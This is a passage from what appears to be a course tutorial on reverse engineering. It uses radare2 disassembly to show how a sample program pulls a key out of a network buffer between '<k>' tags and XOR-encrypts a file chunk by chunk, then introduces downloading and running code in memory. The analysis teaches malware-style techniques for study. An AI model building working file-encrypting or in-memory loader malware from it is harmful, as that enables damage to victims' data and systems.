<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a14</span>      <span class="mi">0</span><span class="n">fb600</span>         <span class="n">movzx</span> <span class="n">eax</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a17</span>      <span class="mi">3</span><span class="n">c6b</span>           <span class="n">cmp</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x6b</span>            <span class="p">;</span> <span class="mi">107</span>
<span class="err">│</span>    <span class="err">┌────</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273a19</span>      <span class="mi">755</span><span class="n">b</span>           <span class="n">jne</span> <span class="mh">0x55fa6e273a76</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a1b</span>      <span class="mi">8</span><span class="n">b45f0</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">]</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a1e</span>      <span class="mi">4898</span>           <span class="n">cdqe</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a20</span>      <span class="mi">488</span><span class="n">d5002</span>       <span class="n">lea</span> <span class="n">rdx</span><span class="p">,</span> <span class="p">[</span><span class="n">rax</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a24</span>      <span class="mi">488</span><span class="n">b45e8</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_18h</span><span class="p">]</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a28</span>      <span class="mi">4801</span><span class="n">d0</span>         <span class="n">add</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rdx</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a2b</span>      <span class="mi">0</span><span class="n">fb600</span>         <span class="n">movzx</span> <span class="n">eax</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a2e</span>      <span class="mi">3</span><span class="n">c3e</span>           <span class="n">cmp</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3e</span>            <span class="p">;</span> <span class="mi">62</span>
<span class="err">│</span>   <span class="err">┌─────</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273a30</span>      <span class="mi">7544</span>           <span class="n">jne</span> <span class="mh">0x55fa6e273a76</span>
<span class="err">│</span>   <span class="err">│││╎│</span>   <span class="mh">0x55fa6e273a32</span>      <span class="mi">8</span><span class="n">b45f0</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">]</span>
<span class="err">│</span>   <span class="err">│││╎│</span>   <span class="mh">0x55fa6e273a35</span>      <span class="mi">83</span><span class="n">c003</span>         <span class="n">add</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">3</span>
<span class="err">│</span>   <span class="err">│││╎│</span>   <span class="mh">0x55fa6e273a38</span>      <span class="mi">8945</span><span class="n">fc</span>         <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_4h</span><span class="p">],</span> <span class="n">eax</span>
<span class="err">│</span>  <span class="err">┌──────</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273a3b</span>      <span class="n">eb27</span>           <span class="n">jmp</span> <span class="mh">0x55fa6e273a64</span>
<span class="err">│</span> <span class="err">┌───────</span><span class="o">&gt;</span> <span class="mh">0x55fa6e273a3d</span>      <span class="mi">8</span><span class="n">b45fc</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_4h</span><span class="p">]</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="mh">0x55fa6e273a40</span>      <span class="mi">4863</span><span class="n">d0</span>         <span class="n">movsxd</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="mh">0x55fa6e273a43</span>      <span class="mi">488</span><span class="n">b45e8</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_18h</span><span class="p">]</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="mh">0x55fa6e273a47</span>      <span class="mi">4801</span><span class="n">d0</span>         <span class="n">add</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rdx</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="mh">0x55fa6e273a4a</span>      <span class="mi">8</span><span class="n">b55f8</span>         <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">]</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="mh">0x55fa6e273a4d</span>      <span class="mi">4863</span><span class="n">ca</span>         <span class="n">movsxd</span> <span class="n">rcx</span><span class="p">,</span> <span class="n">edx</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="mh">0x55fa6e273a50</span>      <span class="mi">488</span><span class="n">b55e0</span>       <span class="n">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_20h</span><span class="p">]</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="mh">0x55fa6e273a54</span>      <span class="mi">4801</span><span class="n">ca</span>         <span class="n">add</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">rcx</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="mh">0x55fa6e273a57</span>      <span class="mi">0</span><span class="n">fb600</span>         <span class="n">movzx</span> <span class="n">eax</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="mh">0x55fa6e273a5a</span>      <span class="mi">8802</span>           <span class="n">mov</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rdx</span><span class="p">],</span> <span class="n">al</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="mh">0x55fa6e273a5c</span>      <span class="mi">8345</span><span class="n">f801</span>       <span class="n">add</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">],</span> <span class="mi">1</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="mh">0x55fa6e273a60</span>      <span class="mi">8345</span><span class="n">fc01</span>       <span class="n">add</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_4h</span><span class="p">],</span> <span class="mi">1</span>
<span class="err">│</span> <span class="err">╎││││╎│</span>   <span class="p">;</span> <span class="n">CODE</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">sym</span><span class="p">.</span><span class="n">getKey</span> <span class="err">@</span> <span class="mh">0x55fa6e273a3b</span>
<span class="err">│</span> <span class="err">╎└──────</span><span class="o">&gt;</span> <span class="mh">0x55fa6e273a64</span>      <span class="mi">8</span><span class="n">b45f0</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">]</span>
<span class="err">│</span> <span class="err">╎</span> <span class="err">│││╎│</span>   <span class="mh">0x55fa6e273a67</span>      <span class="mi">83</span><span class="n">c00d</span>         <span class="n">add</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0xd</span>            <span class="p">;</span> <span class="mi">13</span>
<span class="err">│</span> <span class="err">╎</span> <span class="err">│││╎│</span>   <span class="mh">0x55fa6e273a6a</span>      <span class="mi">3945</span><span class="n">fc</span>         <span class="n">cmp</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_4h</span><span class="p">],</span> <span class="n">eax</span>
<span class="err">│</span> <span class="err">└───────</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273a6d</span>      <span class="mi">7</span><span class="n">cce</span>           <span class="n">jl</span> <span class="mh">0x55fa6e273a3d</span>
<span class="err">│</span>   <span class="err">│││╎│</span>   <span class="mh">0x55fa6e273a6f</span>      <span class="n">c745f4010000</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_ch</span><span class="p">],</span> <span class="mi">1</span>
<span class="err">│</span>   <span class="err">└└└───</span><span class="o">&gt;</span> <span class="mh">0x55fa6e273a76</span>      <span class="mi">8345</span><span class="n">f001</span>       <span class="n">add</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">],</span> <span class="mi">1</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="p">;</span> <span class="n">CODE</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">sym</span><span class="p">.</span><span class="n">getKey</span> <span class="err">@</span> <span class="mh">0x55fa6e2739eb</span>
<span class="err">│</span>      <span class="err">╎└─</span><span class="o">&gt;</span> <span class="mh">0x55fa6e273a7a</span>      <span class="mi">817</span><span class="n">df0ff0000</span><span class="p">.</span>  <span class="n">cmp</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">],</span> <span class="mh">0xff</span>
<span class="err">│</span>      <span class="err">╎┌─</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273a81</span>      <span class="mi">7</span><span class="n">f0a</span>           <span class="n">jg</span> <span class="mh">0x55fa6e273a8d</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273a83</span>      <span class="mi">837</span><span class="n">df400</span>       <span class="n">cmp</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_ch</span><span class="p">],</span> <span class="mi">0</span>
<span class="err">│</span>      <span class="err">└──</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273a87</span>      <span class="mi">0</span><span class="n">f8463ffffff</span>   <span class="n">je</span> <span class="mh">0x55fa6e2739f0</span>
<span class="err">│</span>       <span class="err">└─</span><span class="o">&gt;</span> <span class="mh">0x55fa6e273a8d</span>      <span class="mi">90</span>             <span class="n">nop</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273a8e</span>      <span class="mi">5</span><span class="n">d</span>             <span class="n">pop</span> <span class="n">rbp</span>
<span class="err">└</span>           <span class="mh">0x55fa6e273a8f</span>      <span class="n">c3</span>             <span class="n">ret</span>
<span class="p">[</span><span class="mh">0x55fa6e2739ca</span><span class="p">]</span><span class="o">&gt;</span> 
</code></pre></div></div>
<p>Getkey function is a bit chaotic but let’s focus on the relevant stuff.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e2739fd</span>      <span class="mi">0</span><span class="n">fb600</span>         <span class="n">movzx</span> <span class="n">eax</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273a00</span>      <span class="mi">3</span><span class="n">c3c</span>           <span class="n">cmp</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3c</span>            <span class="p">;</span> <span class="mi">60</span>
<span class="err">│</span>     <span class="err">┌───</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273a02</span>      <span class="mi">7572</span>           <span class="n">jne</span> <span class="mh">0x55fa6e273a76</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a04</span>      <span class="mi">8</span><span class="n">b45f0</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">]</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a07</span>      <span class="mi">4898</span>           <span class="n">cdqe</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a09</span>      <span class="mi">488</span><span class="n">d5001</span>       <span class="n">lea</span> <span class="n">rdx</span><span class="p">,</span> <span class="p">[</span><span class="n">rax</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a0d</span>      <span class="mi">488</span><span class="n">b45e8</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_18h</span><span class="p">]</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a11</span>      <span class="mi">4801</span><span class="n">d0</span>         <span class="n">add</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rdx</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a14</span>      <span class="mi">0</span><span class="n">fb600</span>         <span class="n">movzx</span> <span class="n">eax</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a17</span>      <span class="mi">3</span><span class="n">c6b</span>           <span class="n">cmp</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x6b</span>            <span class="p">;</span> <span class="mi">107</span>
<span class="err">│</span>    <span class="err">┌────</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273a19</span>      <span class="mi">755</span><span class="n">b</span>           <span class="n">jne</span> <span class="mh">0x55fa6e273a76</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a1b</span>      <span class="mi">8</span><span class="n">b45f0</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">]</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a1e</span>      <span class="mi">4898</span>           <span class="n">cdqe</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a20</span>      <span class="mi">488</span><span class="n">d5002</span>       <span class="n">lea</span> <span class="n">rdx</span><span class="p">,</span> <span class="p">[</span><span class="n">rax</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a24</span>      <span class="mi">488</span><span class="n">b45e8</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_18h</span><span class="p">]</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a28</span>      <span class="mi">4801</span><span class="n">d0</span>         <span class="n">add</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rdx</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a2b</span>      <span class="mi">0</span><span class="n">fb600</span>         <span class="n">movzx</span> <span class="n">eax</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
<span class="err">│</span>    <span class="err">││╎│</span>   <span class="mh">0x55fa6e273a2e</span>      <span class="mi">3</span><span class="n">c3e</span>           <span class="n">cmp</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3e</span>            <span class="p">;</span> <span class="mi">62</span>
<span class="err">│</span>   <span class="err">┌─────</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273a30</span>      <span class="mi">7544</span>           <span class="n">jne</span> <span class="mh">0x55fa6e273a76</span>
</code></pre></div></div>
<p>The program enters inside a loop going char by char on the buffer, then compares the actual character with 60 =’&lt;’. Then it will compare the next 2 characters after it with ‘k’ and ‘&gt;’ It’ll loop ten times extracting the key and thus it will be updated after the return through local var_10h</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x55fa6e273bc4</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pxw</span> <span class="err">@</span> <span class="mh">0x7ffc9a81e5b5</span>
<span class="mh">0x7ffc9a81e5b5</span>  <span class="mh">0x33323130</span> <span class="mh">0x37363534</span> <span class="mh">0x47003938</span> <span class="mh">0x2f205445</span>  <span class="mo">01234567</span><span class="mi">89</span><span class="p">.</span><span class="n">GET</span> <span class="o">/</span>
</code></pre></div></div>
<p>Then the crypt function, I won’t get into a lot of detail on it as we already saw it on previous tutorials in this course. So crypfile opens the file and goes chunk by chunk reading/xoring/writting.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="mh">0x55fa6e273b38</span>      <span class="n">e823fdffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">open</span>       <span class="p">;</span> <span class="kt">int</span> <span class="n">open</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">int</span> <span class="n">oflag</span><span class="p">)</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273b3d</span>      <span class="mf">8945e8</span>         <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_18h</span><span class="p">],</span> <span class="n">eax</span>
<span class="err">│</span>       <span class="err">┌─</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273b40</span>      <span class="n">eb2e</span>           <span class="n">jmp</span> <span class="mh">0x55fa6e273b70</span>
<span class="err">│</span>      <span class="err">┌──</span><span class="o">&gt;</span> <span class="mh">0x55fa6e273b42</span>      <span class="mi">488</span><span class="n">d55ed</span>       <span class="n">lea</span> <span class="n">rdx</span><span class="p">,</span> <span class="p">[</span><span class="n">var_13h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273b46</span>      <span class="mi">488</span><span class="n">b45d0</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_30h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273b4a</span>      <span class="mi">4889</span><span class="n">d6</span>         <span class="n">mov</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">rdx</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273b4d</span>      <span class="mi">4889</span><span class="n">c7</span>         <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273b50</span>      <span class="n">e83bffffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">cryp</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273b55</span>      <span class="mi">488</span><span class="n">d4ded</span>       <span class="n">lea</span> <span class="n">rcx</span><span class="p">,</span> <span class="p">[</span><span class="n">var_13h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273b59</span>      <span class="mi">8</span><span class="n">b45e8</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_18h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273b5c</span>      <span class="n">ba0b000000</span>     <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0xb</span>            <span class="p">;</span> <span class="mi">11</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273b61</span>      <span class="mi">4889</span><span class="n">ce</span>         <span class="n">mov</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">rcx</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273b64</span>      <span class="mi">89</span><span class="n">c7</span>           <span class="n">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273b66</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273b6b</span>      <span class="n">e870fcffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">write</span>      <span class="p">;</span> <span class="kt">ssize_t</span> <span class="n">write</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">nbytes</span><span class="p">)</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="p">;</span> <span class="n">CODE</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">sym</span><span class="p">.</span><span class="n">crypFile</span> <span class="err">@</span> <span class="mh">0x55fa6e273b40</span>
<span class="err">│</span>      <span class="err">╎└─</span><span class="o">&gt;</span> <span class="mh">0x55fa6e273b70</span>      <span class="mi">488</span><span class="n">d4ded</span>       <span class="n">lea</span> <span class="n">rcx</span><span class="p">,</span> <span class="p">[</span><span class="n">var_13h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎</span>    <span class="mh">0x55fa6e273b74</span>      <span class="mi">8</span><span class="n">b45e4</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_1ch</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎</span>    <span class="mh">0x55fa6e273b77</span>      <span class="n">ba0b000000</span>     <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0xb</span>            <span class="p">;</span> <span class="mi">11</span>
<span class="err">│</span>      <span class="err">╎</span>    <span class="mh">0x55fa6e273b7c</span>      <span class="mi">4889</span><span class="n">ce</span>         <span class="n">mov</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">rcx</span>
<span class="err">│</span>      <span class="err">╎</span>    <span class="mh">0x55fa6e273b7f</span>      <span class="mi">89</span><span class="n">c7</span>           <span class="n">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>      <span class="err">╎</span>    <span class="mh">0x55fa6e273b81</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>      <span class="err">╎</span>    <span class="mh">0x55fa6e273b86</span>      <span class="n">e8a5fcffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">read</span>       <span class="p">;</span> <span class="kt">ssize_t</span> <span class="n">read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fildes</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">nbyte</span><span class="p">)</span>
<span class="err">│</span>      <span class="err">╎</span>    <span class="mh">0x55fa6e273b8b</span>      <span class="mi">85</span><span class="n">c0</span>           <span class="n">test</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>      <span class="err">└──</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273b8d</span>      <span class="mi">75</span><span class="n">b3</span>           <span class="n">jne</span> <span class="mh">0x55fa6e273b42</span>
</code></pre></div></div>
<p>And cryp goes char by char KSIZE chars and does the XOR with the key</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">│</span>      <span class="err">┌──</span><span class="o">&gt;</span> <span class="mh">0x00000aa5</span>      <span class="mi">8</span><span class="n">b45fc</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_4h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000aa8</span>      <span class="mi">4863</span><span class="n">d0</span>         <span class="n">movsxd</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000aab</span>      <span class="mi">488</span><span class="n">b45e0</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_20h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000aaf</span>      <span class="mi">4801</span><span class="n">d0</span>         <span class="n">add</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rdx</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000ab2</span>      <span class="mi">0</span><span class="n">fb630</span>         <span class="n">movzx</span> <span class="n">esi</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000ab5</span>      <span class="mi">8</span><span class="n">b45fc</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_4h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000ab8</span>      <span class="mi">4863</span><span class="n">d0</span>         <span class="n">movsxd</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000abb</span>      <span class="mi">488</span><span class="n">b45e8</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_18h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000abf</span>      <span class="mi">4801</span><span class="n">d0</span>         <span class="n">add</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rdx</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000ac2</span>      <span class="mi">0</span><span class="n">fb608</span>         <span class="n">movzx</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000ac5</span>      <span class="mi">8</span><span class="n">b45fc</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_4h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000ac8</span>      <span class="mi">4863</span><span class="n">d0</span>         <span class="n">movsxd</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000acb</span>      <span class="mi">488</span><span class="n">b45e0</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_20h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000acf</span>      <span class="mi">4801</span><span class="n">d0</span>         <span class="n">add</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rdx</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000ad2</span>      <span class="mi">31</span><span class="n">ce</span>           <span class="n">xor</span> <span class="n">esi</span><span class="p">,</span> <span class="n">ecx</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000ad4</span>      <span class="mi">89</span><span class="n">f2</span>           <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="n">esi</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000ad6</span>      <span class="mi">8810</span>           <span class="n">mov</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rax</span><span class="p">],</span> <span class="n">dl</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x00000ad8</span>      <span class="mi">8345</span><span class="n">fc01</span>       <span class="n">add</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_4h</span><span class="p">],</span> <span class="mi">1</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="p">;</span> <span class="n">CODE</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">sym</span><span class="p">.</span><span class="n">cryp</span> <span class="err">@</span> <span class="mh">0xaa3</span>
<span class="err">│</span>      <span class="err">╎└─</span><span class="o">&gt;</span> <span class="mh">0x00000adc</span>      <span class="mi">837</span><span class="n">dfc0a</span>       <span class="n">cmp</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_4h</span><span class="p">],</span> <span class="mh">0xa</span>
<span class="err">│</span>      <span class="err">└──</span><span class="o">&lt;</span> <span class="mh">0x00000ae0</span>      <span class="mi">7</span><span class="n">ec3</span>           <span class="n">jle</span> <span class="mh">0xaa5</span>
</code></pre></div></div>
<p>Voilà!</p>

<p>Let’s now move into a new topic that I think may be of great interest.</p>

<h3 id="downloading-and-executing-code-in-memory">Downloading and executing code in memory</h3>

<h4 id="intro-to-shellcode">Intro to shellcode</h4>

<p>This post is not about shellcode writting, we’ll go over that after some tutorials though. In here we’ll just introduce you to a new concept linked to the socket topic whe are dealing wiht.</p>

<p>Let’s start with this very simple program:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
</span>
<span class="kt">void</span> <span class="nf">hello</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">h</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"hello world"</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="n">h</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="n">hello</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>
